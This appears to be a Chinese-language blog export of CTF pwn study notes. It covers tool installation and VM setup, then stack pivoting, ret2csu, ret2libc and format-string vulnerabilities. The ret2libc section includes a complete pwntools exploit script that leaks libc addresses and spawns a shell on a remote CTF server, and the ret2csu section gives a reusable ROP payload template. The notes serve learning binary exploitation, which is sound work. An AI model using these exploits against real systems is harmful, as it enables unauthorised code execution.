pwntoolsPwntools是一个CTF框架和开发库。它是用Python编写的，设计用于快速原型和开发，旨在使开发编写尽可能简单 有两种安装方法，一种是git项目后安装，另一种是pip直接安装。这里我们把pwntools git下来，但是用pip安装，因为后续的工具需要pwntools项目包里的脚本，pip安装不会出错。安装过程时间较长，保持网络状态良好 12cd toolsgit clone https://github.com/Gallopsled/pwntools.git 执行到第二条的时候发现执行不了了，被墙了，别怕 好解决 直接在http后面加上gitclone.com&#x2F;就行了 12gitclone.com/git clone https://gitclone.com/github.com/Gallopsled/pwntools.git 可以看到下载成功了 接下来还要三条指令 123sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essentialpython3 -m pip install --upgrade pippython3 -m pip install --upgrade pwntools 巨久巨久巨久！！而且套娃 安的时候等的我想死 可以看到安装成功了 pwndbg动态调式用的 必安 不安等哭吧 同类的还有peda gef 感兴趣的可以自己去安(如果你安装了两个以上 记得切换souce文件 办法这里不教) 这个也安很久 很烦 1git clone https://gitclone.com/github.com/pwndbg/pwndbg.git 接下来你会看到文件夹里多了一些文件 到对应文件夹里面输入 1./setup.sh 安装完了以后输入gdb看是否成功 还没完 还得安装插件依赖 1sudo pip install keystone-engine ropper keystone-engine ROPgadget找汇编代码神器 必安 12sudo pip3 install capstonegit clone https://gitclone.com/github.com/JonathanSalwan/ROPgadget.git 安装完了以后 进到对应文件夹里面 1sudo python3 setup.py install 安装完了以后输入ROPgadget 别管那个error报错 纯属就是格式问题 one_gadget可装可不装 我是没用到过 下面这段话我当你是看过栈分类中的rop32 这个工具大概就是自动帮我们寻找一串能构成system(&#x2F;bin&#x2F;sh)的汇编代码 我们返回到他给的地址就行了 12sudo apt install -y ruby ruby-devsudo gem install one_gadget 输入查看是否安装成功 1one_gadget --version seccomp-tools这个是沙盒题会用到的了 估计等你学个一个月多就能碰见了(我是这样的) 1sudo gem install seccomp-tools 输入查看是否安装成功 1seccomp-tools --version LibcSearcher这个拿来查libc版本的 求基址偏移用的 我是感觉网页也能做到同样的效果 爱安不安吧 1git clone https://gitclone.com/github.com/lieanu/LibcSearcher.git 进入到对应文件夹再打开终端 1sudo python3 setup.py install 输入检测 12pythonfrom Libcsearcher import* 不过我们发现会报错(返回到桌面运行终端的话) 解决办法也很简单 把刚才安装的那个文件夹里面的这个复制一份到桌面就可以了 但是我们发现实际在使用的使用 libcsearcher仍然会提示说找不到libc版本 哪怕我们泄露出来的函数地址是正确的 应该是libc库没有更新的问题 12345cd LibcSearcherrm -rf libc-databasegit clone https://gitclone.com/github.com/niklasb/libc-database.gitcd libc-database./get ubuntu 然后进行漫长的等待就行了 patchelf这东西和上面那个配套用的 用来切换libc版本 一些堆题和栈题会用到 1sudo apt install patchelf 安装完了以后输入 1patchelf --version ARM软件包没用过 不知道干啥的 爱装不装 用到了再说也行 只要你不嫌麻烦 12sudo apt-get install gcc-arm-linux-gnueabisudo apt-get install gcc-aarch64-linux-gnu MIPS软件包同上 1234sudo apt-get install gcc-mips-linux-gnusudo apt-get install gcc-mipsel-linux-gnusudo apt-get install gcc-mips64-linux-gnuabi64sudo apt-get install gcc-mips64el-linux-gnuabi64 暂时就这点了 以后有用到新的再说","categories":[{"name":"虚拟机","slug":"虚拟机","permalink":"http://example.com/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA/"}],"tags":[]},{"title":"复制粘贴问题解决","slug":"复制粘贴问题解决","date":"2022-09-30T02:51:22.000Z","updated":"2022-09-30T03:06:24.877Z","comments":true,"path":"2022/09/30/复制粘贴问题解决/","link":"","permalink":"http://example.com/2022/09/30/%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/","excerpt":"","text":"Ubuntu20.04无法安装vmtools 或者出现安装了也没办法做到物理机和虚拟机复制粘贴共用 所以这里我们用open-vm-tools 这是一个vmtools官方承认的开源工具 其一样可以起到vmtools的作用 第一步输入下面的指令 1sudo apt-get autoremove open-vm-tools 第二步我们输入 1sudo apt-get install open-vm-tools-desktop 但是很遗憾 会出现这样的问题 这时候我们需要更改一下下载源 网上的方法是说在这里搜索software-update 但是我查看了以后发现找不到 最后找到的解决办法是 因为还没有安装输入法 所以只能先输入set 然后打开设置 一直向下滑 直到看到关于 点进去 找到软件更新 再点进去 如图所示 点开后选择other(也可能显示成其他 看你刚创建虚拟机时的语言选择) 这里挑一个选 我选择的是阿里云的 退出的时候会提醒你这个 直接点重新载入就好了 在终端中输入 1sudo apt-get update 然后我们再输入 1sudo apt-get install open-vm-tools-desktop 发现就可以了 安装完成之后 在终端输入 1reboot 重启一下虚拟机 发现就可以做到物理机和虚拟机复制粘贴互通了","categories":[{"name":"虚拟机","slug":"虚拟机","permalink":"http://example.com/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA/"}],"tags":[]},{"title":"虚拟机安装","slug":"虚拟机安装","date":"2022-09-29T11:02:21.000Z","updated":"2022-09-29T12:47:40.132Z","comments":true,"path":"2022/09/29/虚拟机安装/","link":"","permalink":"http://example.com/2022/09/29/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85/","excerpt":"","text":"虚拟机对于pwn手而言必不可缺，本人直到完成栈的大部分学习后，都没有搭建一个自己的虚拟机 所以这个系列将记录我安装的过程，和安装过程中出现的问题 下载vmware这个不手把手教，因为我已经下过了，不想删了再演示一遍，自己百度吧 创建虚拟机这里我们选择Ubuntu系统，其对于pwn手更加友好 打开vmware 点击创建新的虚拟机 选择第二个 自定义高级 然后点击下一步 这里不需要任何更改，直接下一步就好了 选择第三个 稍后安装操作系统 然后下一步 这一步多动动手点 选择linux ubuntu64位 挑一个地方安装 这个取决于你自己 这个根据自己的cpu核心数选吧 没啥好指导的 毕竟每个人都不一样 内存同理 自己根据情况选吧 不影响使用就行 从这里开始 就一直点下一步就好了 不过别狂点 有个地方还是要注意一下 下面遇到了我会注明文字 好了 接下来注意了 下一个要手动调整一下 这里根据自己的情况分配硬盘大小 不过后面随时都能更改 不够再给也行 别选第一个立刻分配 不然一下子就占用你20g(自己选择的硬盘大小) 这个字面意思理解吧 挑一个地方放虚拟机硬盘 比你设置的大就行了 好了 到了这边 基础的配置就完事了 不过不要急着打开 我们还要编辑一下虚拟机设置 这里我们需要Ubuntu的映像文件 可以去官网下载 也可以找我要一份(不过我大概率懒得给，官网下载不教了 不能养成废人) 设置好了以后我们就可以打开虚拟机了 开机后我们会出现这样一个界面 选择第一个 等待一会 然后出现了这个界面 选择中文 英语大佬可以直接冲 选好了以后我们点右边的选项 安装Ubuntu 键盘布局默认就可以了 这个根据个人的需求吧 我是默认了 然后接下来就一直默认 直到选择时区 然后再下一步 这个账号密码要记牢了 以后有很多地方都要用到 接着就开始等待了 这里等skip亮起来可以点了 建议直接跳过 因为时间真的太长了 别鸟他 直接关了就行了 然后我们重新进行虚拟机的配置 改回物理驱动就可以了使用虚拟机了","categories":[{"name":"虚拟机","slug":"虚拟机","permalink":"http://example.com/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA/"}],"tags":[]},{"title":"堆基础知识","slug":"堆基础知识","date":"2022-09-29T05:05:29.000Z","updated":"2022-10-01T10:23:48.736Z","comments":true,"path":"2022/09/29/堆基础知识/","link":"","permalink":"http://example.com/2022/09/29/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","excerpt":"","text":"从堆部分开始 我们可以认为自己已经初步成为了一名pwn手 大部分的比赛的题目其实都是堆 这是一个复杂的知识块 接下来 我们将花费数月的时间来学习他 什么是堆[ 回顾一下学习栈时的内存分布 我们注意到了堆和栈的不同点 栈是由高地址向低地址增长 而堆是由低地址向高地址增长 并且栈是程序加载进内存后就会生成，而堆需要相关函数(比如malloc，free等)后才会生成 更进一步来说堆是动态分配的（由操作系统内核或者堆管理器） 再来了解一些名词 堆管理器类似于linux内核这样的存在 就是管理系统调用申请的内存 其中linux用到的就是glbc 并且，堆管理器并不是由操作系统实现的，而是由libc.so.6链接库实现，封装了一些系统调用，为用户提供高效便捷的动态内存分配接口和管理系统调用申请来的内存 areanarean相当于堆管理器的内存池，即内存分配区 chunk用户申请内存的单位，也是堆管理器管理内存的基本单位","categories":[{"name":"堆","slug":"堆","permalink":"http://example.com/categories/%E5%A0%86/"}],"tags":[]},{"title":"栈迁移","slug":"栈迁移","date":"2022-09-26T13:40:18.000Z","updated":"2022-09-28T01:13:04.377Z","comments":true,"path":"2022/09/26/栈迁移/","link":"","permalink":"http://example.com/2022/09/26/%E6%A0%88%E8%BF%81%E7%A7%BB/","excerpt":"","text":"我们在基础知识扩展的时候，说到了为了避免有些题目供我们构造的字节数过少，以至于无法给system函数传参的时候该怎么解决 今天所要讲到的内容，也是和栈溢出字节数不够有关 当可以供我们编写的字节数仅够覆盖到ret addr时，并且该程序内并没有后门函数可以供我们利用，我们又该如何实现系统调用呢？ 我们以往的简单栈溢出是通过覆盖ret addr的办法控制程序执行流导向后门函数的位置 但是其本质上 ebp和esp并没有被我们所控制，他仍然是按照原先栈底的汇编代码所运行的 所以我们换个思路？不妨劫持esp和ebp，让他们前往bss段或者其他可以供我们自由写入的区 这样我们就可以自己构建一个后门函数，并且将程序执行流引导至其 那问题就来到了如何劫持esp和ebp 我们先得清楚一下栈帧这个概念 栈帧栈帧也叫过程活动记录，是编译器用来实现函数调用过程的一种数据结构 简单理解就是每次函数的调用，都会生成自己的栈帧 栈帧就相当于函数的调用框架，包含了函数的参数，函数的局部变量，函数执行完后的返回地址 系统是如何定义一个栈帧的？ebp指向了栈帧的栈底，esp指向了函数的栈顶 也就是说，我们把esp和ebp劫持的目的，就是让系统错以为我们写入shellcode的bss段(包括但不限)是一个栈帧 从而执行他 栈迁移原理归根到底，就是要如何劫持esp和ebp 回到我们最开始的栈溢出，我们要溢出的字节数&#x3D;变量var距离esp的字节数+一个字长 这里的一个字长覆盖的是ebp 在我们没有对ebp覆盖的时候，其保存的是上层函数的栈底地址，而ret addr保存的是上层函数执行到了哪个地方，方便子函数结束后返回父函数最后执行的地方 在一个栈帧结束的时候，eip 即将执行 leave 与 ret 两条指令恢复现场(即返回父函数) leave指令相当于 mov esp ebp和pop ebp 他将ebp和esp指向同一地址，这一步相当于腾出了栈帧空间 随后pop ebp 将此时esp指向的old ebp(因为我们上面说过了嘛，ebp保存的是上层函数的栈底地址)赋值给真正的ebp(此时的ebp是定义栈帧栈底的ebp) 是不是有点晕？首先你要分清楚ebp保存的内容和ebp寄存器这两个概念 在子函数调用开始之前，系统会将父函数栈底的地址弹出到新的栈帧，这个值就是ebp(就是我们之前栈溢出用垃圾数据覆盖的那个嘛) 然后记录下当前父函数运行到的地址，将其弹出为ret addr，等子函数结束以后，就会返回到这个地址 所以说，如果我们覆盖ebp的时候不用垃圾数据，而是放入我们要使ebp迁移到的地址，那么ebp就会被我们挟持走 但是此时还有个esp寄存器怎么办？栈帧的空间需要这二者才能定义 你还记不记得我们构造rop链的手法？我们自己再找一个leave的汇编代码地址然后覆盖ret addr不就好了？ 此时mov esp ebp会起到什么效果？ebp已经指向了我们要迁移的地址，所以esp也被挟持到了那边 但是注意，还有一句pop ebp 虽然这句没有任何作用，因为此时新的栈帧的栈顶，其保存的已经是我们要挟持到的地方的地址 但是这一句是出栈指令，此时我们的esp，他指向的地址就会增加一个字长 如图所示，HijackAddr就是我们想要劫持esp ebp到的地址 那栈迁移运作的原理我们已经搞清楚了是吧，接下来想办法构造payload payload &#x3D; cyclic(offset)+pxx(addr)+pxx(leave_addr) 这一个没有问题吧 那只剩下最后一个问题了，我们迁移到的那个地址的栈内容要怎么编写 aaaa是我们最开始的那个地址存放的垃圾数据，即上文说到的HijackAddr,因为pop ebp的原因，esp会指向高一个字长的地方 dddd则是32位情况下的传参，中间要隔个垃圾数据，这没什么好说的 下一个binsh_addr 和binsh字符串是什么意思，当程序连binsh都没给我们的话，反正我们都能自己编写一段栈帧了，我们不是可以自己写入一段binsh，然后我们也知道其地址了，不是就能调用了 后面的old_ebp和ret_addr也没什么好说的，就是一段栈帧必须的要素","categories":[{"name":"栈","slug":"栈","permalink":"http://example.com/categories/%E6%A0%88/"}],"tags":[]},{"title":"ret2csu","slug":"ret2csu","date":"2022-09-25T06:47:11.000Z","updated":"2022-10-06T08:49:52.546Z","comments":true,"path":"2022/09/25/ret2csu/","link":"","permalink":"http://example.com/2022/09/25/ret2csu/","excerpt":"","text":"我们已经了解过了基础的rop，其主要的局限性在于大部分的题目都是动态链接 不一定有那么刚好的汇编代码可以供我们构造rop链 今天我们了解的这种方法，将不受动态链接或者静态链接的限制 我们今天的主角就是libc_csu_init函数，其作用是对libc进行初始化，由于绝大多数的程序都会调用函数，所以libc_csu_init是一定存在的(对于调用函数的程序而言) 那么这个函数究竟有什么奇效，让我们可以做到随意构造rop链呢？ 来看看在ida中，这个函数是什么样子的 1234567891011121314151617181920212223242526272829303132333435363738394041424344.text:00000000004011B0 ; void _libc_csu_init(void).text:00000000004011B0 public __libc_csu_init.text:00000000004011B0 __libc_csu_init proc near ; DATA XREF: _start+16↑o.text:00000000004011B0 ; __unwind &#123;.text:00000000004011B0 push r15.text:00000000004011B2 mov r15, rdx.text:00000000004011B5 push r14.text:00000000004011B7 mov r14, rsi.text:00000000004011BA push r13.text:00000000004011BC mov r13d, edi.text:00000000004011BF push r12.text:00000000004011C1 lea r12, __frame_dummy_init_array_entry.text:00000000004011C8 push rbp.text:00000000004011C9 lea rbp, __do_global_dtors_aux_fini_array_entry.text:00000000004011D0 push rbx.text:00000000004011D1 sub rbp, r12.text:00000000004011D4 sub rsp, 8.text:00000000004011D8 call _init_proc.text:00000000004011DD sar rbp, 3.text:00000000004011E1 jz short loc_4011FE.text:00000000004011E3 xor ebx, ebx.text:00000000004011E5 nop dword ptr [rax].text:00000000004011E8.text:00000000004011E8 loc_4011E8: ; CODE XREF: __libc_csu_init+4C↓j.text:00000000004011E8 mov rdx, r15.text:00000000004011EB mov rsi, r14.text:00000000004011EE mov edi, r13d.text:00000000004011F1 call qword ptr [r12+rbx*8].text:00000000004011F5 add rbx, 1.text:00000000004011F9 cmp rbp, rbx.text:00000000004011FC jnz short loc_4011E8.text:00000000004011FE.text:00000000004011FE loc_4011FE: ; CODE XREF: __libc_csu_init+31↑j.text:00000000004011FE add rsp, 8.text:0000000000401202 pop rbx.text:0000000000401203 pop rbp.text:0000000000401204 pop r12.text:0000000000401206 pop r13.text:0000000000401208 pop r14.text:000000000040120A pop r15.text:000000000040120C retn.text:000000000040120C ; &#125; // starts at 4011B0.text:000000000040120C __libc_csu_init endp 我们的目光聚集到loc_4011FE和loc_4011E8 我们暂且把loc_4011E8命名为gadget1，把loc_4011FE命名为gadget2 由于逻辑顺序的原因，所以我们这里先介绍gadget1 可以看到他先将rsp的位置增加8个字节，这8个字节尤为关键，我们下面再进行解释 接着他pop了多个寄存器，但是仍然没有我们需要的rdi和rsi，不过先别急，再往下想想 最后一行有个retn，我们可以利用这个ret将返回地址修改为gadget2，用意在你看完整个的流程分析后就会明白 再把目光看到gadget2 mov指令将r15和r14以及r13的数据分别传给了寄存器rdx，rsi和edi，这样子实际上就实现了我们要调用函数首先要做到的传参 这里解释一下edi，我们之前不是说过在64位的情况下，是r开头的吗，其实情况也不是绝对的 64位情况下的edi只能改写rdi低32位字节的数据，高32位的字节是无法更改的，不过此时rdi的高32位的数据为0，并不影响我们更改rdi的值 接下来的call指令就是重头戏，可以看到他call的值是r12+rbx*8 有没有一种可能，如果我们把rbx赋值为0，而把r12赋值为我们想要执行的函数地址(为什么不反过来，一是*8转化不方便，还有一个原因下面讲到)，那么我们就可以实现函数调用 接着对rbx进行了+1的操作 而我们上面讲到，我们准备把rbx的值设置为0，所以此时的rbx就为1 cmp对于rbx和rbp二者进行了对比，如果二者相同，则不进行下一条指令，也就是jnz的跳转，即重新执行一次刚才的汇编代码 所以此时我们需要将rbp的值设置为1，才能使其于rbx相等 收回思绪，我们接着想，程序执行完gadget2后会怎么样？ 其实没有多高深的想法，他会按照顺序接着执行下去，那么又回到了我们的gadget1 接下来，由于我们已经实现了我们想要的寄存器传参，所以此时的寄存器是什么值我们已经不在乎了 我们可以简单的用cyclic(8*7)简单的实现填充垃圾数据，然后在末尾的ret在自行决定我们接下来要返回的地址 缕清楚了整个__libc_csu_init函数的思路，我们来回顾一下刚才提出的问题，rsp+8会怎么影响我们的程序，我们来用图表示一下栈结构试试看 第一行和第二行以及第三行没有什么好解释的 常规的栈溢出 然后控制返回地址使程序返回到libc_csu_init函数 此时的sp指针，是指向到了add rsp+8这行汇编代码，+8即让其继续向栈顶增进了一个字长，所以此时我们要在add rsp+8该行汇编代码处填充的数值，可以是任何，即垃圾数据 那么，总结一下，我们可以得出一个通用的payload 12345678910111213141516payload = offset * &#x27;a&#x27; #栈溢出的垃圾数据字节数payload += p64(gagdet2_addr) + &#x27;a&#x27; * 8 #gadgets2的地址payload += p64(0) + p64(1)#rbx=0, rbp=1payload += p64(r12)#call调用的地址payload += p64(r13) + p64(r14) + p64(r15)#三个参数的寄存器payload += p64(gagdet1_addr)#gadgets1的地址payload += &#x27;a&#x27; * 56#第二次pop 由于寄存器是啥数值我们已经不需要了 所以56个字节全部用垃圾数据覆盖payload += p64(last)#函数最后的返回地址 这里还有一点需要注意的 r12这里输入的地址应该是调用函数的got表地址 具体解释可以看HNCTF2022的一题wp","categories":[{"name":"栈","slug":"栈","permalink":"http://example.com/categories/%E6%A0%88/"}],"tags":[]},{"title":"ret2libc","slug":"ret2libc","date":"2022-09-23T12:53:48.000Z","updated":"2022-09-24T16:01:54.574Z","comments":true,"path":"2022/09/23/ret2libc/","link":"","permalink":"http://example.com/2022/09/23/ret2libc/","excerpt":"","text":"前置知识了解随着我们做题的深入，我们会发现有些题目并不会给予我们后门函数，并且也没有ret2shellcode可以供我们存放shellcode的bss段变量 那么我们还有办法自己构建一个后门函数吗 不知道还记不记得在最开始的栈溢出那一题，我们提到了plt表和got表 在当时，为了照顾新手入坑pwn的感受，我们只是粗略的得出plt调用函数，got存真实地址的服务于做题的结论 现在，让我们解释一下这个结论的原因 我们先前已经讲过，got表的作用是因为动态链接的存在，为了使应用程序方便的获取libc中的真实地址 并且只有当程序运行和函数调用过后，got表中保存的才会是该函数的libc的绝对地址 而plt表虽然引用的也是got表中的真实地址，但是注意这里并不是说明got表能够调用这个函数 plt表之所以能够调用函数，而got不行的关键原因是因为plt表还起到了把控制(程序执行流)转移到对应的函数 当然上述的解释并不详细，许多原理性的问题没有讲到，如果将来想要死磕pwn的同学，建议花时间去专研透底层逻辑的问题(当然现在没有必要) 所以我们是不是可以得出一条逻辑链，当程序没有给予我们现成的后门函数的时候，我们可以通过system的plt表来调用system函数 但是说的容易做起来难，我们如何获得system函数的plt表地址呢？ 这里我们只需要记住一个公式 真实地址 &#x3D; 基址 + 偏移 即我们通过puts等函数泄露出来的函数地址是真实地址，我们可以通过计算偏移来求出libc基址 然后依据libc基址和偏移量得出其他函数的真实地址，从而随意调用 但是如果我们不了解libc版本，即题目附件并为给出呢 这里还需要了解一下libc中函数地址偏移的概念 如果开启了pie保护机制，函数的地址将在每次运行时发生变化 但是其后三位由于虚拟地址页的映射机制，将不会发生变化(前提是在同一个libc版本中) 因此，如果题目没有给予我们libc文件的话，我们可以通过函数的后三位来推演出libc版本，从而求得libc基址 wp演示 先看一下保护机制，但是看不出什么苗头 拖到ida里面看看 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s[32]; // [rsp+0h] [rbp-20h] BYREF init(argc, argv, envp); puts(&quot;Glad to meet you again!What u bring to me this time?&quot;); fgets(s, 96, stdin); puts(&quot;Ok.See you!&quot;); return 0;&#125; 有一个fgets输入任意字节的数据可以用来栈溢出，但是看了下函数列表，好像没有后门函数可以供我们返回 并且程序也没有提供给我们可以用来泄露函数地址的puts等 没办法了，我们只能连同puts函数泄露其真实地址一起构造 看到这里是不是仍然不太明白，看看exp的构造就知道了 123456789101112131415161718192021221 from pwn import* 2 io = remote(&quot;node4.buuoj.cn&quot;,28548)3 elf = ELF(&quot;./pwn&quot;)4 libc = ELF(&quot;./libc-2.31.so&quot;)5 io.recvuntil(&quot;Glad to meet you again!What u bring to me this time?&quot;)6 puts_got = elf.got[&#x27;puts&#x27;]7 main_addr = elf.symbols[&#x27;main&#x27;]8 rdi_addr = 0x4007539 ret_addr = 0x40050e10 puts_got = elf.got[&#x27;puts&#x27;]11 puts_plt = elf.plt[&#x27;puts&#x27;]12 payload = cyclic(40)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)13 io.sendline(payload)14 io.recvuntil(&quot;Ok.See you!&quot;)15 puts_addr = u64(io.recvuntil(&quot;\\nGlad to meet you again!What u bring to me this time?\\n&quot;,drop = True).ljust(8,b&#x27;\\x00&#x27;))16 libc_addr = puts_addr - libc.symbols[&#x27;puts&#x27;]17 system_addr = libc_addr + libc.symbols[&#x27;system&#x27;]18 binsh_addr = libc_addr + next(libc.search(b&#x27;/bin/sh&#x27;))19 payload = cyclic(40)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)20 io.sendline(payload)21 io.recvuntil(&quot;Ok.See you!&quot;)22 io.interactive() 第四行这里，我们之所以要装载题目附件所给我们的libc-2.31.so文件 是因为我们需要获取该libc版本的各函数相较于基址的偏移 同理，这里还有两种办法可以获取(实际上还有三种，但是最后一种我还不会用[截止到文章发布，如果后续学会了将会补上]) 获取libc版本偏移-第一种办法 在该网站 我们可以通过输入对应函数的后3位数值来检索对应的libc版本(比如图中检索到了3个版本，通常是都得试试的) libc database search (blukat.me) 获取libc版本偏移-第二种办法 libcsearch这个工具也能获取偏移 由于网上对于这个工具的安装和使用不计其数 这里我只负责介绍这个工具，安装过程如果出现问题可以看看这个博客(3条消息) LibcSearcher的安装使用_Catch_1t_AlunX的博客-CSDN博客 说回到exp，我们继续往下看，截止到12行的第一个payload都是一些前置的要点获取 cyclic生成40个字节的垃圾数据这个没有任何难度理解 rdi寄存器传参这条之前也解释过了，puts_got显然就是将puts函数的真实地址传给rdi 接下来的puts_plt便是调用puts函数，输出puts函数的真实地址 接着为什么要返回到main函数？因为我们还需要接收puts的真实地址，并且我们只能输入96个字节的数据，如果一次性构造payload过长则无法成功 第三个疑点来到了15行，有很多我们没有见过的语法？ u64，[-6:]，ljust？这些都是什么东西，一个一个讲 u64&#x2F;u32 不知道你还记不记得我们之前讲过的bite型，他起到了数据的传输和存储的作用 你是不是一直有个疑问，为什么我们要用到p64和p32 实际上p是将括号内的数据打包成二进制字节数据流(可以理解为bite型) 而如果我们要想接收，并且转化为我们能看懂的数据类型，就需要用到u 为了方便理解，我们看一下如果没有u64，我们得到的数据会是什么样子 [-n:] 其作用就是决定recv从倒数第n个字节开始读取 但是为什么这里是6呢？我们试试4，5，7这些数字会导致什么结果 这里不知道你发现没有，一个字节对应着两个字符(之前提过了，这里小复习一下) 并且由于小端序，所以我们从倒数第几个字节开始接收，影响着我们得到的真实地址的后三位 拜托，这可是致命的错误，后三位错了我们还怎么获得偏移 通常，函数的真实地址虽然是8字节(64位)，但是由于其头两个字节的数据恒为00 00 所以我们只需要从倒数第六字节开始读取(反而言之，就是你要从倒8处读也行) 欸 你说 我偏不要呢 我就不要[-6:]你来帮我限制读入的字节数量 反正我就8字节的地址呗 如果你尝试了以后就会报错，为什么？ 因为我们不单单只读入了函数的真实地址，数据传输以及内存地址分配是一个复杂的过程 而我们将其改为100试试，仍然可以正常读入数据 但是你会发现在地址结尾处多出来了个0a，实际上他是换行符，这个换行符是哪里来的？ 仔细观察14行 我们在接收的时候，并未一起接收换行符 这一点说明了什么?修改为100后都能读取倒上一个字符串的数据了，那我们刚刚不还说在函数地址上面，还有很多其他数据呢？ 这里就可以介绍介绍ljust了 ljust 他的作用就是限制我们读入的字节总数，如果不够的话则以我们设定好的字符填充 所以我们哪怕[-n:]中的n取到了100也仍然不会报错 说回exp 在第一个payload输送完以后，我们成功获得函数的真实地址 接着就是计算偏移然后求得其他函数以及binsh字符串的地址 还是老办法构造payload，并且这里还需要一个ret来栈对齐 补充：一点小补充吧 相信会有人和我有一样的疑问，在刚接触到ret2libc的时候 既然我们都将got表中的puts函数真实地址作为参数存储在了rdi寄存器中输送再接收 而且获取真实地址的方法只需要一个elf.got就行了 为什么我们不能直接拿这个地址来进行计算基址呢？ 很简单，我们debug看一下，如果我们直接使用got表中的真实地址，他是一个什么东西 我们再看一下 通过我们上文的办法得到的真实地址长什么样子 可以看到明显不一样 这是因为got表中保存的值是需要运行过后才会为真实地址，所以我们需要将其打印出来再接收(这里我也有点不太理解，埋个坑，日后填)","categories":[{"name":"栈","slug":"栈","permalink":"http://example.com/categories/%E6%A0%88/"}],"tags":[]},{"title":"格式化字符串基础漏洞","slug":"格式化字符串基础漏洞","date":"2022-09-22T13:55:33.000Z","updated":"2022-10-12T02:26:22.143Z","comments":true,"path":"2022/09/22/格式化字符串基础漏洞/","link":"","permalink":"http://example.com/2022/09/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"格式化字符串漏洞原理printf应该是我们学习c语言起使用的最频繁的函数了 其语法我们熟悉的不能再熟悉了—&gt;printf (“格式化字符串”,参量… ) 我们可以写一段代码： 1234567#include &lt;stdio.h&gt;int main()&#123; int n=5; printf(&quot;%d&quot;,n); return 0;&#125; 当然我们也可以这样写： 1234567#include &lt;stdio.h&gt;int main()&#123; char a[]=&quot;chen&quot;; printf(a); return 0;&#125; 第二种写法虽然没有格式化字符但是仍然可以输出chen这个字符串 那我们再看看第三种写法 1234567#include &lt;stdio.h&gt;int main()&#123; char a[]=&quot;%x%x%x&quot;; printf(a); return 0;&#125; 这次我们没有给printf函数参数，只是仅仅给他格式化字符，猜一下，这次能成功吗，如果成功了，会输出什么？ 输出了像地址的16进制？ 我们明明没有给他用以输出的参数，那么这串数据是从哪里来的？ 我们用图来表示一下printf输出的时候栈结构是什么样子 ps:关于这图，格式化字符串不一定要放在栈顶才能实现任意地址写入，注意别被误导了，下面会提一嘴 如果我们只传入了格式化字符串而没有传入参数 那么格式化字符串仍然会遵循着原先的逻辑，向高地址处逐个字长的输出当前栈的内容&#x2F;指针(输出的方式根据其格式化字符的不同而不同) 这是因为printf函数并不知道参数个数，它的内部有个指针，用来索检格式化字符串。对于特定类型%，就去取相应参数的值，直到索检到格式化字符串结束 pwn题中的格式化字符串通常有两种出法 第一种，使用格式化字符串泄露栈上的内容(canary或者是随机数不一定)，由于wp分类中的HUBU2022.fmt已经是这方面的例题了，这里不做额外的讲解，感兴趣的可以去wp分区中自行查看 第二种，也是难度较前者稍高，不好理解的一种 任意内存的读取及任意内存写入我们首先得了解一个不常用的格式化字符串**%n** 他的作用是将在其之前打印出来的字节数赋值给指定的变量 比如: AAAA%n 就会赋值4给变量 如果我们后面跟上要修改的变量地址，就可以做到任意地址的写入 没懂？没关系来看一道例题 开了canary保护，大概率是格式化字符串 看看ida 12345678910111213141516171819202122232425262728293031323334353637int __cdecl main(int a1)&#123; unsigned int v1; // eax int result; // eax int fd; // [esp+0h] [ebp-84h] char nptr[16]; // [esp+4h] [ebp-80h] BYREF char buf[100]; // [esp+14h] [ebp-70h] BYREF unsigned int v6; // [esp+78h] [ebp-Ch] int *v7; // [esp+7Ch] [ebp-8h] v7 = &amp;a1; v6 = __readgsdword(0x14u); setvbuf(stdout, 0, 2, 0); v1 = time(0); srand(v1); fd = open(&quot;/dev/urandom&quot;, 0); read(fd, &amp;dword_804C044, 4u); printf(&quot;your name:&quot;); read(0, buf, 0x63u); printf(&quot;Hello,&quot;); printf(buf); printf(&quot;your passwd:&quot;); read(0, nptr, 0xFu); if ( atoi(nptr) == dword_804C044 ) &#123; puts(&quot;ok!!&quot;); system(&quot;/bin/sh&quot;); &#125; else &#123; puts(&quot;fail&quot;); &#125; result = 0; if ( __readgsdword(0x14u) != v6 ) sub_80493D0(); return result;&#125; 这里的&#x2F;dev&#x2F;urandom是什么？ 我们只需要了解他是linux系统中的随机伪设备，他的作用就是提供永不为空的随机字节流 浅看一下他生成的字节流长什么样子 说回这道题，看逻辑应该是要我们输入这个随机数，如果一样就调用system(&#x2F;bin&#x2F;sh) 而存放这个随机数的就是dword_804C044的地址 那我们这时候应该有两种想法，一种是泄露这个随机数，输入他 还有一种是通过修改这个随机数的值来判定成功 第一种办法本人是没法做出来，感兴趣的可以试一试 那么讲一下第二种办法，由上文的学习我们已经知道 要想用格式化字符串漏洞泄露栈上的内容，需要我们知道目标地址和格式化字符串存放的地址的偏移 用gdb看一下偏移 现在main函数处设置一个断点(这里由于main函数被删符号表了，所以b main的话gdb查找不到函数的，删符号表的体现就是在ida中main函数不是粗体字，ida只是凭借逻辑识别他为main函数) 接着运行并且跳转到输入字符串这边，我们先输入8个A看一下栈分布的情况 这里还是先解释一下x&#x2F;20wx $esp这个命令是什么意思 其作用是用gdb查看内存 格式: x &#x2F;n u f n是要显示的内存单元个数 f表示显示方式, 可取如下值 u表示一个地址单元的长度 这里的x&#x2F;20wx 的意思就是说查看20个4字节长度的内存单元 并且按16进制的格式显示 至于为什么是以esp为初始地址显示 是因为格式化字符串%n进行任意地址改写是在ESP所指向的地址处所指向的地址处写入数据(可以理解为栈顶) 所以我们需要知道当我们最终构造的payload中需要改写的地址内容距离esp的偏移是多少 而且也正是因为这一点，决定了我们可以不用一定要把格式化字符串放在栈顶 这里可以看到代表着AAAAAAAA的两个0x4141414141距离esp的偏移是10和11(如果我们只输入4个A只会占用偏移10这个字长，因为这是32位程序，等下编写exp的不要被搞晕了) 所以此时我们要如何构造我们的payload？ 